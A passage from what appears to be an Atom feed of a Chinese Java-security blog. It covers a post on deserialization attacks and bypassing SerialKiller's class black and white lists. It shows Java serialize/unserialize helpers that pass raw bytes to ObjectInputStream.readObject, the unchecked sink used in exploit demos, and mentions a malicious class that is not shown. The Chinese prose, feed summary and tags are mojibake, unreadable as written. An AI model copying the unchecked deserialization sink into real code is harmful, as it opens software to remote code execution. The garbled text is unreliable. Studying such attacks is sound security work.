class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="keyword">try</span>(<span class="type">ByteArrayInputStream</span> <span class="variable">bain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">oin</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bain))&#123;</span><br><span class="line">            oin.readObject();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] serialize(Object o) <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="keyword">try</span>(<span class="type">ByteArrayOutputStream</span> <span class="variable">baout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">oout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baout))&#123;</span><br><span class="line">            oout.writeObject(o);</span><br><span class="line">            <span class="keyword">return</span> baout.toByteArray();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ¶æ„ç±»åœ¨ä¸Šé¢å†™äº†</p><p>å°é—®é¢˜ï¼š<br>è¿™é‡Œç›´æ¥æŠŠå­—èŠ‚ç å†™ä¸Šå»å´ä¸èƒ½æ‰§è¡Œ<br>æŠ¥é”™<br><img src="https://img-blog.csdnimg.cn/2ac5d1fd01d349499f1c91a2706a1451.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;çœæµ&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#çœæµ&quot;&gt;#&lt;/a&gt; çœæµ&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;SerialKiller&lt;/code&gt; &lt;br&gt;
 å¯ä»¥é€šè¿‡â¿Šåå•ä¸â½©åå•çš„â½…å¼æ¥é™åˆ¶ååºåˆ—åŒ–æ—¶å…è®¸é€šè¿‡çš„&lt;br&gt;
ç±»ï¼Œå…¶ä¸­é™åˆ¶äº†</summary>
      
    
    
    
    
    <category term="ä»£ç å®¡è®¡" scheme="https://ki10moc.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="Javaå®‰å…¨" scheme="https://ki10moc.github.io/tags/Java%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
</feed>
